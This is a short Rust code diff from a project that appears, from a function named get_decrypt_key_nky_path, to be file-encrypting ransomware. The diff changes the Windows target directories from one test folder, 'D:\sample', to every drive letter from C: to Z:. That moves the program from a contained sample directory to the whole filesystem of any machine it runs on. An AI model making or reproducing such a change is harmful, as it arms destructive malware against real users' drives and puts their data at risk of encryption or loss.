@@ -39,8 +39,8 @@ pub fn get_decrypt_key_nky_path() -> String {
 pub static ROOT_DIRS: [&str; 1] = ["/"];
 
 #[cfg(target_family = "windows")]
-/*pub static ROOT_DIRS: [&str; 24] = [
+pub static ROOT_DIRS: [&str; 24] = [
     "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:",
     "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:",
-];*/
-pub static ROOT_DIRS: [&str; 1] = ["D:\\sample"];
+];
+// pub static ROOT_DIRS: [&str; 1] = ["D:\\sample"];
